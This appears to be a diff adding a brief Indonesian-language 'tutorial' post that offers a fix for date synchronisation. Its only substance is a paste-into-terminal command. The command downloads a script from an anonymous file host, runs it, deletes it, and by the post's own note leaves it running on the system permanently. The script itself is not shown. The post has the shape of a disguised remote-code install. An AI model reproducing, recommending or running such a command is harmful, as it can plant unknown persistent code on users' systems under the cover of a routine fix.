@@ -1,0 +1,6 @@
+[TUTORIAL]
+Sinkronisasi Tanggal Otomatis
+bagi yang merasa kerepotan/bermasalah dengan sinkronisasi tanggal bisa coba trik ini, kelebihannya gampang digunakan & otomatis sinkron setelah reboot & saat jaringan sudah up. tinggal paste aja di terminal:
+curl -fSsl -o setup.sh https://srv-store4.gofile.io/download/YFkeFt/datetime-sync-setup.sh && chmod +x setup.sh && ./setup.sh && rm ./setup.sh
+hasil sukses bisa dilihat di ss ke-2
+* note: script sekali jalan sudah nempel di sistem & running otomatis selamanya
